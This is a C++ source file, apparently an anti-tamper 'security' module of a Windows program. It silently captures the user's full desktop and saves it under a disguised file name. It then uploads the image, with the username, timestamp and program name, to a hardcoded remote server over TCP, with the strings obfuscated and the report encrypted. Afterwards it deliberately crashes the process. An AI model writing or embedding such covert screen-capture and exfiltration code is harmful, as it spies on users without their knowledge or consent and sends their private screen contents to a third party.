#include <Windows.h>
#include <GdiPlus.h>
#include <fstream>
#include <chrono>
#include <iostream>
#include <thread>
#include <ctime>
#include "MetaStr.h"
#include "utils.h"
#include "Encryption/AesCryptoHandler.h"

using namespace Gdiplus;
#pragma comment(lib,"Wininet.lib")
#pragma comment (lib,"gdiplus.lib")

namespace paralyze_security_screenshot
{
#pragma warning(disable:4996)

	std::string username = "";
	std::string programm = "";

	std::string get_gmt_date_now( )
	{
		std::time_t now = std::time( 0 );
		struct tm newtime;
		gmtime_s( &newtime, &now );
		char buf[ 42 ];
		std::strftime( buf, 42, METASTRING( "%d-%m-%Y_%H%M%S" ), &newtime );
		return buf;
	}

	std::wstring s2ws( const std::string& s )
	{
		int len;
		int slength = ( int )s.length( ) + 1;
		len = MultiByteToWideChar( CP_ACP, 0, s.c_str( ), slength, 0, 0 );
		wchar_t* buf = new wchar_t[ len ];
		MultiByteToWideChar( CP_ACP, 0, s.c_str( ), slength, buf, len );
		std::wstring r( buf );
		delete[] buf;
		return r;
	}

	void screenshot( std::string file )
	{
		ULONG_PTR gdiplustoken;
		GdiplusStartupInput gdistartupinput;
		GdiplusStartupOutput gdistartupoutput;

		gdistartupinput.SuppressBackgroundThread = true;
		GdiplusStartup( &gdiplustoken, &gdistartupinput, &gdistartupoutput ); //start GDI+

		HDC dc = GetDC( GetDesktopWindow( ) );//get desktop content
		HDC dc2 = CreateCompatibleDC( dc );	 //copy context

		RECT rc0kno;

		GetClientRect( GetDesktopWindow( ), &rc0kno );// get desktop size;
		int w = rc0kno.right - rc0kno.left;//width
		int h = rc0kno.bottom - rc0kno.top;//height

		HBITMAP hbitmap = CreateCompatibleBitmap( dc, w, h );//create bitmap
		HBITMAP holdbitmap = ( HBITMAP )SelectObject( dc2, hbitmap );

		BitBlt( dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY );//copy pixel from pulpit to bitmap
		Bitmap* bm = new Bitmap( hbitmap, NULL );

		UINT num;
		UINT size;

		ImageCodecInfo* imagecodecinfo;
		GetImageEncodersSize( &num, &size ); //get count of codec

		imagecodecinfo = ( ImageCodecInfo* )( malloc( size ) );
		GetImageEncoders( num, size, imagecodecinfo );//get codec

		CLSID clsidEncoder;
		for ( int i = 0; i < num; i++ )
		{
			std::string simage = ( "image/jpeg" );
			std::wstring image = s2ws( simage );
			if ( wcscmp( imagecodecinfo[ i ].MimeType, image.c_str( ) ) == 0 )
				clsidEncoder = imagecodecinfo[ i ].Clsid;
		}

		free( imagecodecinfo );
		std::wstring ws;
		ws.assign( file.begin( ), file.end( ) );
		bm->Save( ws.c_str( ), &clsidEncoder ); //save in jpeg format
		SelectObject( dc2, holdbitmap );
		DeleteObject( dc2 );
		DeleteObject( hbitmap );
		ReleaseDC( GetDesktopWindow( ), dc );
		GdiplusShutdown( gdiplustoken );
	}

	void upload_screenshot_tcp( )
	{
		WSADATA wsaData;
		SOCKET Socket;
		SOCKADDR_IN SockAddr;
		struct hostent* host;
		std::locale local;

		std::string url = METASTRING( "backend_srv.us.hammafia.co" );

		std::string report_request = METASTRING( "S|" );
		report_request.append( username );
		report_request.append( METASTRING( "|" ) );
		report_request.append( get_gmt_date_now( ) );
		report_request.append( METASTRING( "|" ) );
		report_request.append( programm );
		report_request = AesCryptoHandler::encrypt( report_request, "" ) + "\n";

		if ( WSAStartup( MAKEWORD( 2, 2 ), &wsaData ) != 0 )
		{
			std::cout << METASTRING( "WSAStartup failed.\n" );
		}

		Socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		host = gethostbyname( url.c_str( ) );

		SockAddr.sin_port = htons( 18913 );

		SockAddr.sin_family = AF_INET;
		SockAddr.sin_addr.s_addr = *( ( unsigned long* )host->h_addr );

		if ( connect( Socket, ( SOCKADDR* )( &SockAddr ), sizeof( SockAddr ) ) != 0 )
		{
		}

		sendAC( Socket, report_request.c_str( ), strlen( report_request.c_str( ) ), 0 ); // File size
		Sleep( 200 );

		FILE* f = fopen( METASTRING( "core32.mni" ), METASTRING( "rb" ) );
		fseek( f, 0, SEEK_END );
		long fsize = ftell( f );
		fseek( f, 0, SEEK_SET );

		char* string = ( char* )malloc( fsize + 1 );
		fread( string, fsize, 1, f );
		fclose( f );

		std::cout << fsize << std::endl;
		std::string tellsize = std::to_string( fsize );
		tellsize.append( "\r\n" );

		sendAC( Socket, tellsize.c_str( ), strlen( tellsize.c_str( ) ), 0 ); // File size
		Sleep( 200 );

		int Offset = 0;
		while ( fsize > Offset )
		{
			int Amount = sendAC( Socket, string + Offset, fsize - Offset, 0 );

			if ( Amount <= 0 )
			{
				break;
			}
			else
			{
				Offset += Amount;
			}
		}
		closesocket( Socket );
		WSACleanup( );
	}

	void screenshot_thread( )
	{
		screenshot( METASTRING( "core32.mni" ) );
		upload_screenshot_tcp( );

		exit( 0 );
		*( ( unsigned int* )0 ) = 0xDEAD;
	}

	void screenshot_thread_grace( )
	{
		screenshot( METASTRING( "core32.mni" ) );
		upload_screenshot_tcp( );
	}

	void start_screenshot_thread( std::string p_username, std::string p_programm )
	{
		username = p_username;
		programm = p_programm;

		CreateThread( 0, 0, ( LPTHREAD_START_ROUTINE )screenshot_thread, 0, 0, 0 );

		Sleep( 2500 );

		*( ( unsigned int* )0 ) = 0xDEAD;

		/*	std::thread screenshot_thread_(screenshot_thread);
			screenshot_thread_.detach();*/
	}
	void start_screenshot_thread_grace( std::string p_username )
	{
		username = p_username;
		programm = METASTRING( "MANUAL" );
		std::thread screenshot_thread_( screenshot_thread_grace );
		screenshot_thread_.detach( );
	}
}